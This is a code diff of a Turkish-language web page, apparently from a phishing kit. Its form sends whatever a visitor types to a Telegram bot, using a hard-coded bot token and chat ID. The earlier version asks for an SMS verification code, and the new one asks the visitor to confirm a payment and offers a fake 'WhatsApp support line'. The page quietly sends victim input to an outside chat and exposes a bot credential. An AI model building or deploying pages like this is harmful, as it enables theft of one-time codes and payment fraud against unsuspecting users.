@@ -22,7 +22,7 @@
             margin-top: 20px; /* Logo ile sayfa üstü arasındaki boşluk */
             margin-bottom: 20px;
         }
-        #telegramForm {
+        #telegramForm, #whatsappBtn {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -32,6 +32,7 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Hafif gölge efekti */
             max-width: 80%; /* Formun maksimum genişliği */
             margin: 0 auto; /* Sayfa ortasına hizalama */
+            margin-bottom: 20px; /* Buton ile arasındaki boşluk */
         }
         #messageText {
             width: 100%;
@@ -41,7 +42,7 @@
             border: 1px solid #ccc; /* Kenarlık rengi */
             border-radius: 5px;
         }
-        #submitBtn {
+        #submitBtn, #whatsappBtn {
             padding: 15px;
             background-color: #4CAF50;
             color: white;
@@ -54,20 +55,24 @@
 <body>
     <img id="logo" src="./logo.png" alt="Logo">
     <form id="telegramForm">
-        <label for="messageText">SMS DOĞRULAMASI</label>
-        <input type="tel" id="messageText" placeholder="" oninput="validateInput(this)" pattern="\d*" required>
+        <label for="messageText">ODEME SAGLANDIYSA (EVET) YAZINIZ</label>
+        <input type="text" id="messageText" placeholder="" oninput="validateInput(this)" pattern="[a-zA-Z0-9\s]+" required>
         <button type="button" id="submitBtn" onclick="sendMessage()">Gönder</button>
     </form>
 
+    <!-- WhatsApp Destek Hattı Butonu -->
+    <button type="button" id="whatsappBtn" onclick="redirectToWhatsApp()">Whatsapp Destek Hattı</button>
+
     <script>
         function validateInput(input) {
-            input.value = input.value.replace(/\D/g, ''); // Sadece rakamları kabul et
+            // Girişte yalnızca harf, rakam ve boşluk karakterlerini kabul et
+            input.value = input.value.replace(/[^a-zA-Z0-9\s]/g, '');
         }
 
         function sendMessage() {
             var messageText = document.getElementById('messageText').value;
             var apiUrl = 'https://api.telegram.org/bot6310872354:AAEXpycTL7iDBrndrBPpMhr-_aAepxC3VVk/sendMessage';
-            var chatId = '-1002103168295';
+            var chatId = '-1002121014985';
 
             fetch(apiUrl, {
                 method: 'POST',
@@ -82,12 +87,20 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Telegram API Response:', data);
+                alert('Mesajınız başarıyla gönderildi!');
                 window.location.href = 'test2.html';
             })
             .catch(error => {
                 console.error('Error sending message:', error);
                 alert('Mesaj gönderilemedi. Hata oluştu.');
             });
+        }
+
+        function redirectToWhatsApp() {
+            var whatsappNumber = '+905011067305';
+            var whatsappUrl = 'https://wa.me/' + whatsappNumber;
+
+            window.location.href = whatsappUrl;
         }
     </script>
 </body>
